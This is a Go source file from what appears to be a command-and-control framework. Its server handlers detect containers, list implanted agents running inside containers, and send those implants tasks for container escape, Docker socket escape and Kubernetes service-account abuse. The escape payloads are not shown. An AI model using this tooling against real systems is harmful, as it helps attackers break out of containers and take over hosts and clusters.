package server

import (
	"log/slog"
	"net/http"
	"os"
	"runtime"
	"strings"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/pkg/protocol"
	"github.com/gin-gonic/gin"
)

// containerInfo holds server-side container detection results.
type containerInfo struct {
	IsContainer bool   `json:"is_container"`
	Type        string `json:"type"`
	Details     string `json:"details"`
}

// detectContainer checks whether the server itself is running inside a container.
func detectContainer() containerInfo {
	if runtime.GOOS != "linux" {
		return containerInfo{IsContainer: false, Type: "none", Details: "not linux"}
	}

	// Check /.dockerenv
	if _, err := os.Stat("/.dockerenv"); err == nil {
		details := "detected /.dockerenv"
		if cgroup, err := os.ReadFile("/proc/1/cgroup"); err == nil {
			cg := strings.TrimSpace(string(cgroup))
			if strings.Contains(cg, "docker") {
				details += "; cgroup confirms docker"
			}
		}
		return containerInfo{IsContainer: true, Type: "docker", Details: details}
	}

	// Check Kubernetes service account
	if host := os.Getenv("KUBERNETES_SERVICE_HOST"); host != "" {
		return containerInfo{IsContainer: true, Type: "kubernetes", Details: "KUBERNETES_SERVICE_HOST=" + host}
	}

	// Check /proc/1/cgroup for container hints
	if cgroup, err := os.ReadFile("/proc/1/cgroup"); err == nil {
		cg := strings.TrimSpace(string(cgroup))
		if strings.Contains(cg, "docker") {
			return containerInfo{IsContainer: true, Type: "docker", Details: "cgroup: " + cg}
		}
		if strings.Contains(cg, "kubepods") {
			return containerInfo{IsContainer: true, Type: "kubernetes", Details: "cgroup: " + cg}
		}
		if strings.Contains(cg, "lxc") || strings.Contains(cg, "nspawn") {
			return containerInfo{IsContainer: true, Type: "lxc", Details: "cgroup: " + cg}
		}
		if strings.Contains(cg, "containerd") {
			return containerInfo{IsContainer: true, Type: "containerd", Details: "cgroup: " + cg}
		}
	}

	// Check /proc/1/environ for container hints
	if environ, err := os.ReadFile("/proc/1/environ"); err == nil {
		env := string(environ)
		if strings.Contains(env, "container=") {
			return containerInfo{IsContainer: true, Type: "podman", Details: "container env var found"}
		}
	}

	return containerInfo{IsContainer: false, Type: "none", Details: "no container indicators"}
}

// handleContainerStatus returns whether the server itself is running inside a container.
// GET /api/container/status
func (s *Server) handleContainerStatus(c *gin.Context) {
	info := detectContainer()
	respond(c, info)
}

// handleContainerAgents returns agents that are running inside containers.
// GET /api/container/agents
func (s *Server) handleContainerAgents(c *gin.Context) {
	var agents []db.Implant
	q := s.db.Where("os LIKE ? OR os LIKE ?", "%container%", "%docker%")
	q = s.tenantScope(q, c)
	if err := q.Limit(500).Find(&agents).Error; err != nil {
		respondError(c, http.StatusInternalServerError, "failed to query agents")
		return
	}
	// Also match agents with container-related hostnames or notes
	var extra []db.Implant
	extraQ := s.db.Where("hostname LIKE ? OR notes LIKE ?", "%container%", "%docker%")
	extraQ = s.tenantScope(extraQ, c)
	if err := extraQ.Limit(500).Find(&extra).Error; err != nil {
		slog.Error("Failed to query container-hinted agents", "err", err)
		respondError(c, http.StatusInternalServerError, "failed to query container-hinted agents")
		return
	}
	seen := make(map[string]struct{}, len(agents))
	for i := range agents {
		seen[agents[i].ID] = struct{}{}
	}
	for i := range extra {
		if _, ok := seen[extra[i].ID]; !ok {
			agents = append(agents, extra[i])
		}
	}
	respond(c, gin.H{"agents": agents, "count": len(agents)})
}

// handleContainerDetect dispatches a container detection task to an agent.
// POST /agents/:id/container_detect
func (s *Server) handleContainerDetect(c *gin.Context) {
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: protocol.TaskTypeContainerDetect})
	if task == nil {
		return
	}
	slog.Info("Container detect requested", "agent_id", id)
	s.dispatchTask(c, task, "container_detect", "detect container environment")
}

// handleContainerEscape dispatches a generic container escape task to an agent.
// POST /agents/:id/container_escape
func (s *Server) handleContainerEscape(c *gin.Context) {
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: protocol.TaskTypeContainerEscape})
	if task == nil {
		return
	}
	slog.Info("Container escape requested", "agent_id", id)
	s.dispatchTask(c, task, "container_escape", "generic container escape")
}

// handleContainerDocker dispatches a Docker socket escape task to an agent.
// POST /agents/:id/container_docker
func (s *Server) handleContainerDocker(c *gin.Context) {
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: protocol.TaskTypeContainerDocker})
	if task == nil {
		return
	}
	slog.Info("Container Docker escape requested", "agent_id", id)
	s.dispatchTask(c, task, "container_docker", "docker socket escape")
}

// handleContainerK8s dispatches a Kubernetes service account abuse escape task.
// POST /agents/:id/container_k8s
func (s *Server) handleContainerK8s(c *gin.Context) {
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: protocol.TaskTypeContainerK8s})
	if task == nil {
		return
	}
	slog.Info("Container K8s escape requested", "agent_id", id)
	s.dispatchTask(c, task, "container_k8s", "kubernetes service account abuse")
}
